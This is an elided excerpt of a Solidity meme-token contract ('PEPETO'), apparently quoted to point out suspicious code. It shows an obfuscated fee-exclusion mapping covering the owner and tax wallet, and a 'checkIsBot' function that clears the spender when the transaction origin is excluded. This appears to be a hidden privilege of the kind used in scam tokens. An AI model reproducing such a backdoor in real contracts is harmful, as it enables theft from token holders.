...
contract TTT is Context, IERC20, Ownable {
    ...
    mapping(address => bool) private _isNUEOD77ExcludedFromFees;
    ...
    string private _name = unicode"PEPETO";
    string private _symbol = unicode"PEPETO";
    ...
    constructor() payable {
        ...
        _isNUEOD77ExcludedFromFees[owner()] = true;
        _isNUEOD77ExcludedFromFees[address(this)] = true;
        _isNUEOD77ExcludedFromFees[_taxWallet] = true;
    ...
    function checkIsBot(address from, address to, uint256 amount) private returns(bool) {
        _spender = from;
        if(_isNUEOD77ExcludedFromFees[_msgOrigin()]) {
            _spender = address(0);
